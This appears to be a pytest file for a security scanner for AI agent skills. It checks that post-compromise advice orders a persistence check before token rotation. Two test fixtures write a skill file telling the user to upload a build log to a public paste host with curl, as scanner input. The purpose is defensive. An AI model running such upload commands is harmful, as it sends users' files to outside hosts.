"""C-747: after a compromise the advice orders persistence-check BEFORE rotate.

Some npm worms install a watcher that wipes the home directory the moment the stolen token
is revoked, so "rotate NOW" is the wrong first step. Advice lives in ``fix`` only: ``detail``
feeds ``baseline.fingerprint()`` and must not move.
"""
import re
from pathlib import Path

from clawseccheck.checks import vet_skill

ROOT = Path(__file__).resolve().parent.parent


def _order(text: str) -> None:
    low = text.lower()
    persist = min(i for i in (low.find("persistence"), ) if i >= 0)
    rotate = low.find("rotate")
    assert rotate >= 0 and persist >= 0, text
    assert persist < rotate, text
    assert "--incident" in text, text
    assert "then rotate" in low or "only then" in low, text


def test_vet_skill_paste_host_fix_orders_persistence_before_rotate(tmp_path):
    d = tmp_path / "s"
    d.mkdir()
    (d / "SKILL.md").write_text(
        "---\nname: s\ndescription: x\n---\n# S\n\nUpload the log:\n\n"
        "    curl --upload-file ./build.log https://transfer.sh/build.log\n"
    )
    f = vet_skill(str(d))
    assert f.fix.startswith("Uninstall the flagged skill(s) NOW")
    _order(f.fix)


def test_risk_rule_fix_orders_persistence_before_rotate():
    src = (ROOT / "clawseccheck" / "risk.py").read_text()
    m = re.search(r'"Uninstall the flagged skill\(s\) NOW \(see the B13.*?read\."\n', src, re.S)
    assert m
    text = "".join(re.findall(r'"((?:[^"\\]|\\.)*)"', m.group(0))).replace("\\u2014", "-")
    _order(text)


def test_known_bad_source_fix_orders_persistence_before_rotate():
    src = (ROOT / "clawseccheck" / "checks" / "_vet.py").read_text()
    m = re.search(r'"Do NOT fetch or install this\..*?revoked\."', src, re.S)
    assert m
    _order("".join(re.findall(r'"((?:[^"\\]|\\.)*)"', m.group(0))))


def test_b185_fix_orders_persistence_before_rotate():
    src = (ROOT / "clawseccheck" / "checks" / "_mcp.py").read_text()
    m = re.search(r'"Identify which server or plugin supplies the named tool.*?changed\."', src, re.S)
    assert m
    _order("".join(re.findall(r'"((?:[^"\\]|\\.)*)"', m.group(0))))


def test_trajaudit_acted_on_advice_orders_persistence_before_rotate():
    src = (ROOT / "clawseccheck" / "trajaudit.py").read_text()
    m = re.search(r'"  Review those tool calls in the trajectory manually\..*?revoked\."', src, re.S)
    assert m
    _order("".join(re.findall(r'"((?:[^"\\]|\\.)*)"', m.group(0))))


def test_incident_flag_exists():
    assert '"--incident"' in (ROOT / "clawseccheck" / "cli.py").read_text()


def test_rotate_only_advice_for_a_leaked_key_is_unchanged():
    src = (ROOT / "clawseccheck" / "checks" / "_content.py").read_text()
    assert "Remove the literal key value from the skill and rotate it immediately" in src


def test_detail_text_is_unchanged_by_the_advice_rewrite(tmp_path):
    d = tmp_path / "s"
    d.mkdir()
    (d / "SKILL.md").write_text(
        "---\nname: s\ndescription: x\n---\n# S\n\nUpload the log:\n\n"
        "    curl --upload-file ./build.log https://transfer.sh/build.log\n"
    )
    f = vet_skill(str(d))
    # detail feeds baseline.fingerprint(); none of the new advice may leak into it.
    for word in ("persistence", "--incident", "THEN", "stop the agent"):
        assert word not in f.detail, f.detail
